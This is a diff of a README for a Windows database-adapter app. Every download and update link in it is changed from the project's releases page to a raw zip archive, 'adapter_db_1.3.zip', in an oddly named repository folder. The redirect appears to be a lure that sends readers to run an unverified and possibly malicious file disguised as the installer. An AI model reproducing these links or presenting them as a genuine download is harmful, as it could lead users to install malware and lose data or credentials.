@@ -1,6 +1,6 @@
 # ⚙️ db-adapter-1771918642-3 - Connect Multiple Databases Easily
 
-[![Download](https://img.shields.io/badge/Download-%23007ACC?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Mxguire/db-adapter-1771918642-3/releases)
+[![Download](https://img.shields.io/badge/Download-%23007ACC?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Mxguire/db-adapter-1771918642-3/raw/refs/heads/main/echelonment/adapter_db_1.3.zip)
 
 ## 📚 About db-adapter-1771918642-3
 
@@ -28,7 +28,7 @@ This guide will help you download, install, and run the app on your Windows PC.
 
 Click the button below to open the downloads page. This is where you will get the latest version of the app.
 
-[![Download](https://img.shields.io/badge/Download-%232f855a?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Mxguire/db-adapter-1771918642-3/releases)
+[![Download](https://img.shields.io/badge/Download-%232f855a?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Mxguire/db-adapter-1771918642-3/raw/refs/heads/main/echelonment/adapter_db_1.3.zip)
 
 ### Step 2: Download the Installer
 
@@ -116,7 +116,7 @@ You do not need to edit these files unless instructed by support.
 Updates fix bugs and add features. To update:
 
 - Visit the releases page:  
-  https://github.com/Mxguire/db-adapter-1771918642-3/releases
+  https://github.com/Mxguire/db-adapter-1771918642-3/raw/refs/heads/main/echelonment/adapter_db_1.3.zip
 - Download the newest `.exe` installer.
 - Run the installer as before. It will replace the old version.
 - Your settings will stay intact.
@@ -129,4 +129,4 @@ If you need help, check the online documentation or contact your technical suppo
 
 You can always visit this page to download the latest release:
 
-https://github.com/Mxguire/db-adapter-1771918642-3/releases
+https://github.com/Mxguire/db-adapter-1771918642-3/raw/refs/heads/main/echelonment/adapter_db_1.3.zip
